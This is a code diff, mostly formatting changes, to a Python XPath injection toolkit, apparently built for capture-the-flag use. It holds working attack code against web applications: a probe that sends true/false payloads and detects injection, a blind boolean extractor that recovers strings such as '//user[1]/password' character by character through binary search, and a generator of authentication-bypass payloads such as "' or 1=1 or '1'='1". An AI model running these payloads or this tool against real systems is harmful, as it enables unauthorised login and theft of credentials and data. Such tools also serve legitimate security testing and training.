@@ -6,7 +6,6 @@ Provides XPath injection detection, blind boolean extraction, and payload genera
 
 import json
 import re
-import time
 from typing import Dict, List, Optional, Tuple
 
 import requests
@@ -54,7 +53,7 @@ class XPathProbeTool:
         ("' or ''='", "true", "OR empty string equals empty string"),
         ("1 or 1=1", "true", "Numeric OR true"),
         ("' or 1=1 or '1'='1", "true", "Double OR true"),
-        ("\" or \"1\"=\"1", "true", "Basic OR true (double quotes)"),
+        ('" or "1"="1', "true", "Basic OR true (double quotes)"),
         ("') or ('1'='1", "true", "OR true with parentheses"),
         ("' or string-length('a')=1 or '1'='1", "true", "string-length true condition"),
         ("' or true() or '1'='1", "true", "XPath true() function"),
@@ -85,7 +84,9 @@ class XPathProbeTool:
         test_data = {**form_data, param: payload}
         try:
             if method == "GET":
-                resp = self.session.get(url, params=test_data, headers=headers, timeout=timeout)
+                resp = self.session.get(
+                    url, params=test_data, headers=headers, timeout=timeout
+                )
             else:
                 # Detect JSON content type
                 content_type = ""
@@ -94,9 +95,13 @@ class XPathProbeTool:
                         content_type = v.lower()
                         break
                 if "application/json" in content_type:
-                    resp = self.session.post(url, json=test_data, headers=headers, timeout=timeout)
+                    resp = self.session.post(
+                        url, json=test_data, headers=headers, timeout=timeout
+                    )
                 else:
-                    resp = self.session.post(url, data=test_data, headers=headers, timeout=timeout)
+                    resp = self.session.post(
+                        url, data=test_data, headers=headers, timeout=timeout
+                    )
             return resp, None
         except Exception as exc:
             return None, str(exc)
@@ -195,13 +200,15 @@ class XPathProbeTool:
                     output_lines.append(f"  [+] TRUE  differs from baseline: {desc}")
                     output_lines.append(f"      Payload: {payload}")
                     output_lines.append(f"      Response: {status_info}")
-                    interesting_payloads.append({
-                        "payload": payload,
-                        "type": "true_condition",
-                        "desc": desc,
-                        "status": resp.status_code,
-                        "length": len(resp.text),
-                    })
+                    interesting_payloads.append(
+                        {
+                            "payload": payload,
+                            "type": "true_condition",
+                            "desc": desc,
+                            "status": resp.status_code,
+                            "length": len(resp.text),
+                        }
+                    )
                 else:
                     output_lines.append(f"  [-] TRUE  matches baseline: {desc}")
 
@@ -211,13 +218,15 @@ class XPathProbeTool:
                     output_lines.append(f"  [+] FALSE differs from baseline: {desc}")
                     output_lines.append(f"      Payload: {payload}")
                     output_lines.append(f"      Response: {status_info}")
-                    interesting_payloads.append({
-                        "payload": payload,
-                        "type": "false_condition",
-                        "desc": desc,
-                        "status": resp.status_code,
-                        "length": len(resp.text),
-                    })
+                    interesting_payloads.append(
+                        {
+                            "payload": payload,
+                            "type": "false_condition",
+                            "desc": desc,
+                            "status": resp.status_code,
+                            "length": len(resp.text),
+                        }
+                    )
                 else:
                     output_lines.append(f"  [-] FALSE matches baseline: {desc}")
 
@@ -227,13 +236,15 @@ class XPathProbeTool:
                     output_lines.append(f"  [!] ERROR differs from baseline: {desc}")
                     output_lines.append(f"      Payload: {payload}")
                     output_lines.append(f"      Response: {status_info}")
-                    interesting_payloads.append({
-                        "payload": payload,
-                        "type": "error",
-                        "desc": desc,
-                        "status": resp.status_code,
-                        "length": len(resp.text),
-                    })
+                    interesting_payloads.append(
+                        {
+                            "payload": payload,
+                            "type": "error",
+                            "desc": desc,
+                            "status": resp.status_code,
+                            "length": len(resp.text),
+                        }
+                    )
                 else:
                     output_lines.append(f"  [-] ERROR matches baseline: {desc}")
 
@@ -282,9 +293,7 @@ class XPathProbeTool:
                     "  No differentials found between true and false conditions."
                 )
         else:
-            output_lines.append(
-                "  Insufficient responses for differential analysis."
-            )
+            output_lines.append("  Insufficient responses for differential analysis.")
 
         # Check for XPath-specific error messages
         xpath_error_patterns = [
@@ -348,17 +357,29 @@ class XPathProbeTool:
             output_lines.append("")
             output_lines.append("RECOMMENDATIONS:")
             output_lines.append("  1. Use xpath_blind_boolean tool to extract data")
-            output_lines.append("  2. Use xpath_payload_generator for auth bypass payloads")
-            output_lines.append("  3. Try extracting node names with: count(//*)  and  name(//*[1])")
-            output_lines.append("  4. Check for inverted oracles (success message = false condition)")
+            output_lines.append(
+                "  2. Use xpath_payload_generator for auth bypass payloads"
+            )
+            output_lines.append(
+                "  3. Try extracting node names with: count(//*)  and  name(//*[1])"
+            )
+            output_lines.append(
+                "  4. Check for inverted oracles (success message = false condition)"
+            )
         else:
             output_lines.append("[-] No obvious XPath injection detected.")
             output_lines.append("")
             output_lines.append("RECOMMENDATIONS:")
             output_lines.append("  - Try different parameters")
-            output_lines.append("  - Check if input is used in a different XPath context")
-            output_lines.append("  - Try double-quote variants if single-quote probes failed")
-            output_lines.append("  - Consider that responses may use an inverted oracle")
+            output_lines.append(
+                "  - Check if input is used in a different XPath context"
+            )
+            output_lines.append(
+                "  - Try double-quote variants if single-quote probes failed"
+            )
+            output_lines.append(
+                "  - Consider that responses may use an inverted oracle"
+            )
 
         return "\n".join(output_lines)
 
@@ -437,7 +458,9 @@ class XPathBlindBooleanTool:
         test_data = {**form_data, param: payload}
         try:
             if method == "GET":
-                resp = self.session.get(url, params=test_data, headers=headers, timeout=timeout)
+                resp = self.session.get(
+                    url, params=test_data, headers=headers, timeout=timeout
+                )
             else:
                 # Detect JSON content type
                 content_type = ""
@@ -446,9 +469,13 @@ class XPathBlindBooleanTool:
                         content_type = v.lower()
                         break
                 if "application/json" in content_type:
-                    resp = self.session.post(url, json=test_data, headers=headers, timeout=timeout)
+                    resp = self.session.post(
+                        url, json=test_data, headers=headers, timeout=timeout
+                    )
                 else:
-                    resp = self.session.post(url, data=test_data, headers=headers, timeout=timeout)
+                    resp = self.session.post(
+                        url, data=test_data, headers=headers, timeout=timeout
+                    )
             return resp, None
         except Exception as exc:
             return None, str(exc)
@@ -586,13 +613,13 @@ class XPathBlindBooleanTool:
             if true_in_false and not true_in_true:
                 inverted = True
                 logs.append("  INVERTED ORACLE DETECTED!")
-                logs.append(
-                    "  The 'success' indicator appears in FALSE conditions."
-                )
+                logs.append("  The 'success' indicator appears in FALSE conditions.")
             elif true_in_true and not true_in_false:
                 logs.append("  Oracle is NORMAL (not inverted).")
             else:
-                logs.append("  Indicator appears in both or neither - using response length.")
+                logs.append(
+                    "  Indicator appears in both or neither - using response length."
+                )
                 # Fall back to response length comparison
                 # Typically the "success" page is longer, so if the false response
                 # is longer, the oracle is inverted
@@ -619,7 +646,9 @@ class XPathBlindBooleanTool:
         else:
             # No indicators - use response length heuristic
             logs.append("  No indicators provided - using response differential only.")
-            logs.append("  Assuming non-inverted oracle (use true_indicator/false_indicator for accuracy).")
+            logs.append(
+                "  Assuming non-inverted oracle (use true_indicator/false_indicator for accuracy)."
+            )
 
         return inverted, logs
 
@@ -649,10 +678,7 @@ class XPathBlindBooleanTool:
 
             # Build XPath condition: substring(expr, pos, 1) > chr(mid)
             # We use the > comparison for binary search
-            condition = (
-                f"substring({xpath_expression},{position},1)>"
-                f"'{chr(mid)}'"
-            )
+            condition = f"substring({xpath_expression},{position},1)>" f"'{chr(mid)}'"
             payload = f"{payload_prefix} or ({condition}) or {payload_suffix}"
 
             resp, error = self._make_request(
@@ -681,7 +707,9 @@ class XPathBlindBooleanTool:
             # Verify the character is not null (end of string)
             # Test: substring(expr, pos, 1) = ''
             empty_condition = f"substring({xpath_expression},{position},1)=''"
-            empty_payload = f"{payload_prefix} or ({empty_condition}) or {payload_suffix}"
+            empty_payload = (
+                f"{payload_prefix} or ({empty_condition}) or {payload_suffix}"
+            )
 
             empty_resp, error = self._make_request(
                 url, method, param, empty_payload, form_data, headers, timeout
@@ -719,7 +747,11 @@ class XPathBlindBooleanTool:
             return "[XPathBlindBooleanTool] Error: 'param' (string) is required."
 
         operation = data.get("operation")
-        if not operation or operation not in ("test_condition", "extract_char", "extract_string"):
+        if not operation or operation not in (
+            "test_condition",
+            "extract_char",
+            "extract_string",
+        ):
             return (
                 "[XPathBlindBooleanTool] Error: 'operation' must be 'test_condition', "
                 "'extract_char', or 'extract_string'."
@@ -756,8 +788,14 @@ class XPathBlindBooleanTool:
         inverted = False
         if detect_inversion:
             inverted, inversion_logs = self._detect_oracle_inversion(
-                url, method, param, form_data, headers, timeout,
-                true_indicator, false_indicator,
+                url,
+                method,
+                param,
+                form_data,
+                headers,
+                timeout,
+                true_indicator,
+                false_indicator,
             )
             output_lines.extend(inversion_logs)
             output_lines.append("")
@@ -836,8 +874,12 @@ class XPathBlindBooleanTool:
                 output_lines.append(f"Oracle inversion: {'YES' if inverted else 'NO'}")
                 output_lines.append("")
                 output_lines.append("NEXT STEPS:")
-                output_lines.append("  1. Use operation='extract_char' to extract single characters")
-                output_lines.append("  2. Use operation='extract_string' to extract full values")
+                output_lines.append(
+                    "  1. Use operation='extract_char' to extract single characters"
+                )
+                output_lines.append(
+                    "  2. Use operation='extract_string' to extract full values"
+                )
                 output_lines.append(
                     "  3. Try xpath_expression='//user[1]/password' for password extraction"
                 )
@@ -853,9 +895,7 @@ class XPathBlindBooleanTool:
                     is_true = self._is_true_response(
                         resp, true_indicator, false_indicator, true_baseline, inverted
                     )
-                    output_lines.append(
-                        f"Condition: {condition}"
-                    )
+                    output_lines.append(f"Condition: {condition}")
                     output_lines.append(
                         f"RESULT: {'TRUE' if is_true else 'FALSE'} "
                         f"(Status={resp.status_code}, Length={len(resp.text)})"
@@ -874,10 +914,20 @@ class XPathBlindBooleanTool:
             output_lines.append("-" * 40)
 
             char, logs = self._binary_search_char(
-                url, method, param, xpath_expression, position,
-                form_data, headers, timeout,
-                true_indicator, false_indicator, true_baseline, inverted,
-                payload_prefix, payload_suffix,
+                url,
+                method,
+                param,
+                xpath_expression,
+                position,
+                form_data,
+                headers,
+                timeout,
+                true_indicator,
+                false_indicator,
+                true_baseline,
+                inverted,
+                payload_prefix,
+                payload_suffix,
             )
 
             output_lines.extend(logs)
@@ -910,7 +960,9 @@ class XPathBlindBooleanTool:
 
             for test_len in range(1, max_length + 1):
                 len_condition = f"string-length({xpath_expression})>={test_len}"
-                len_payload = f"{payload_prefix} or ({len_condition}) or {payload_suffix}"
+                len_payload = (
+                    f"{payload_prefix} or ({len_condition}) or {payload_suffix}"
+                )
 
                 resp, error = self._make_request(
                     url, method, param, len_payload, form_data, headers, timeout
@@ -950,10 +1002,20 @@ class XPathBlindBooleanTool:
 
             for pos in range(1, string_length + 1):
                 char, logs = self._binary_search_char(
-                    url, method, param, xpath_expression, pos,
-                    form_data, headers, timeout,
-                    true_indicator, false_indicator, true_baseline, inverted,
-                    payload_prefix, payload_suffix,
+                    url,
+                    method,
+                    param,
+                    xpath_expression,
+                    pos,
+                    form_data,
+                    headers,
+                    timeout,
+                    true_indicator,
+                    false_indicator,
+                    true_baseline,
+                    inverted,
+                    payload_prefix,
+                    payload_suffix,
                 )
 
                 # Only include the final result line, not all binary search steps
@@ -976,7 +1038,7 @@ class XPathBlindBooleanTool:
 
             output_lines.append("")
             output_lines.append("=" * 50)
-            output_lines.append(f"EXTRACTED DATA: \"{extracted}\"")
+            output_lines.append(f'EXTRACTED DATA: "{extracted}"')
             output_lines.append(f"Length: {len(extracted)} characters")
 
             # Check for CTF flags
@@ -1047,12 +1109,12 @@ class XPathPayloadGenerator:
             "description": "Double OR to ensure true evaluation",
         },
         {
-            "payload": "\" or \"1\"=\"1",
+            "payload": '" or "1"="1',
             "context": "Double-quote string context",
             "description": "Basic OR true for double-quote contexts",
         },
         {
-            "payload": "\" or \"\"=\"",
+            "payload": '" or ""="',
             "context": "Double-quote string context",
             "description": "OR empty=empty for double-quote contexts",
         },
@@ -1062,7 +1124,7 @@ class XPathPayloadGenerator:
             "description": "Bypass with parentheses: //user[(name='INPUT')]/pass",
         },
         {
-            "payload": "\") or (\"1\"=\"1",
+            "payload": '") or ("1"="1',
             "context": "Parenthesized double-quote",
             "description": "Bypass with parentheses for double-quote contexts",
         },
@@ -1277,7 +1339,7 @@ class XPathPayloadGenerator:
             )
 
         output_lines = [
-            f"[XPathPayloadGenerator] XPath Injection Payloads",
+            "[XPathPayloadGenerator] XPath Injection Payloads",
             "=" * 50,
             f"Operation: {operation}",
             "",
@@ -1295,11 +1357,19 @@ class XPathPayloadGenerator:
 
             output_lines.append("=== Usage Tips ===")
             output_lines.append("1. Try payloads in both username and password fields")
-            output_lines.append("2. If single quotes are filtered, try double-quote variants")
-            output_lines.append("3. If parentheses are in the query, use parenthesized payloads")
+            output_lines.append(
+                "2. If single quotes are filtered, try double-quote variants"
+            )
+            output_lines.append(
+                "3. If parentheses are in the query, use parenthesized payloads"
+            )
             output_lines.append("4. Observe response differences to detect injection")
-            output_lines.append("5. Some apps use XPath like: //user[name='INPUT' and pass='INPUT']")
-            output_lines.append("   In that case, username payload may need to close the and clause")
+            output_lines.append(
+                "5. Some apps use XPath like: //user[name='INPUT' and pass='INPUT']"
+            )
+            output_lines.append(
+                "   In that case, username payload may need to close the and clause"
+            )
 
         elif operation == "data_extraction":
             output_lines.append("=== Blind Boolean Extraction Templates ===")
@@ -1320,8 +1390,12 @@ class XPathPayloadGenerator:
 
             output_lines.append("=== Extraction Workflow ===")
             output_lines.append("1. Determine string length: string-length(EXPR)>N")
-            output_lines.append("2. Binary search each character: substring(EXPR,POS,1)>'X'")
-            output_lines.append("3. Or use xpath_blind_boolean tool with operation='extract_string'")
+            output_lines.append(
+                "2. Binary search each character: substring(EXPR,POS,1)>'X'"
+            )
+            output_lines.append(
+                "3. Or use xpath_blind_boolean tool with operation='extract_string'"
+            )
             output_lines.append("")
             output_lines.append("=== Full Payload Example ===")
             output_lines.append(
@@ -1352,7 +1426,9 @@ class XPathPayloadGenerator:
             output_lines.append("1. Start with count() to understand document size")
             output_lines.append("2. Use name() to discover element names")
             output_lines.append("3. Use string-length() before extracting values")
-            output_lines.append("4. Look for elements named 'flag', 'secret', 'password'")
+            output_lines.append(
+                "4. Look for elements named 'flag', 'secret', 'password'"
+            )
             output_lines.append("5. Check for attributes with count(@*)")
 
         return "\n".join(output_lines)
